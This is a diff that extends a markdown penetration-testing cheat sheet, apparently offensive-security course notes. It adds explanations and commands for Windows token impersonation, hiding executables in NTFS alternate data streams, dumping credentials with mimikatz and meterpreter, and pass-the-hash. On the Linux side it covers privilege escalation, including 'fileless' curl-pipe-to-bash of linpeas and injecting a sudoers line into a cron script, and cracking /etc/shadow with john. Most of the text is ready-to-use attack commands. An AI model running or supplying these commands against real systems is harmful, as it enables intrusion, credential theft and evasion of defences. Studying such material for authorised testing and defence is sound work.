@@ -132,6 +132,7 @@ shell → Akagi64.exe 23 C:\Temp\backdoor.exe        # akagi64.exe [Key] [Param]
 ```
 
 ### Access token impersonation
+Tokens (made by LSASS at logon) = temporary keys describing a process's security context. **Impersonate-level** (non-interactive logon) works only on the local box; **Delegate-level** (interactive/RDP logon) can act on other networked devices. Need one of: **SeAssignPrimaryToken**, **SeCreateToken**, or **SeImpersonatePrivilege**.
 ```text
 # meterpreter (unprivileged):
 pgrep explorer ; migrate <explorer_PID> ; getuid ; getprivs
@@ -140,13 +141,26 @@ impersonate_token "NT AUTHORITY\SYSTEM"            # or "DOMAIN\Administrator"
 getuid ; getprivs
 ```
 
+### Alternate Data Streams (ADS) — NTFS hiding
+NTFS files have a data stream + resource stream; attackers hide payloads in a named ADS to dodge signature AV / static analysis.
+```text
+notepad.exe file.txt:secret.txt            # edits the hidden stream; file.txt looks empty
+type malware.exe > nothing_bad.txt:mal.exe # hide an exe in a stream (delete the original yourself)
+mklink good.exe C:\nothing_bad.txt:mal.exe # symlink to RUN the hidden exe
+dir /r                                      # reveal streams
+```
+
 ### Windows credential dumping
+Hashes live in the **SAM** (locked by the NT kernel, encrypted with syskey → dump from **LSASS** memory, needs admin). **LSA** handles auth. **LM** (pre-NT4): password split in 2, upper-cased, DES, **no salt** → rainbow-table weak. **NTLM** (Vista+): MD4, case-sensitive, symbols/unicode, not split; LM disabled by default.
 ```text
 # exploit → migrate to lsass → dump
+pgrep lsass ; migrate <lsass_PID>
 load kiwi ; creds_all ; lsa_dump_sam ; lsa_dump_secrets
 # mimikatz:
 upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ; shell
 mimikatz.exe → privilege::debug ; lsadump::sam ; lsadump::secrets ; sekurlsa::logonPasswords
+# creds in unattended-install files (often base64 — easy decode):
+#   C:\Windows\Panther\Unattend.xml  /  Autounattend.xml
 # Pass-the-Hash (authenticate with the NTLM hash — no cracking; works post-patch; lateral movement)
 #   hash line format = user:RID:LMhash:NTLMhash:::  (LM is often AAD3B...=empty)
 #   Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
@@ -207,12 +221,14 @@ hydra -l admin -P unix_passwords.txt <TARGET_IP> smb
 
 ## Linux Privilege Escalation
 ```bash
-# Kernel — Linux-Exploit-Suggester
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
-chmod +x les.sh && ./les.sh
+# Kernel — Linux-Exploit-Suggester / linpeas (fileless: pipe to bash, no disk trace)
+curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+# (kernel exploits are risky → data loss/crash; confirm version range first)
 
 # Cron jobs
-crontab -l ; find / -name <CRONJOB_SCRIPT>
+crontab -l ; cat /etc/crontab ; find / -name <CRONJOB_SCRIPT>
+grep -rnw / -e "/etc/shadow_bkp" 2>/dev/null    # find the script that references a known file
 printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
 
 # SUID (GTFOBins — gtfobins.github.io)
@@ -226,8 +242,16 @@ sudo -l ; sudo man ls → !/bin/bash    # GTFOBins the allowed binary
 ```
 
 ### Linux credential dumping
+Hashes are in **/etc/shadow** (root-only); /etc/passwd is world-readable but holds no hashes. Can't pass-the-hash like NTLM — must crack. Algorithm shown by the `$N$` prefix:
+| Prefix | Algorithm | Crackability |
+|---|---|---|
+| `$1$` | MD5 | trivial |
+| `$2$` | Blowfish (bcrypt) | easy-ish |
+| `$5$` | SHA-256 | possible |
+| `$6$` | SHA-512 | slow |
 ```bash
 cat /etc/passwd ; sudo cat /etc/shadow
+unshadow passwd shadow > unshadowed.txt ; john --wordlist=rockyou.txt unshadowed.txt
 use post/linux/gather/hashdump         # metasploit, post-exploit
 use auxiliary/analyze/crack_linux      # set SHA512 true
 ```
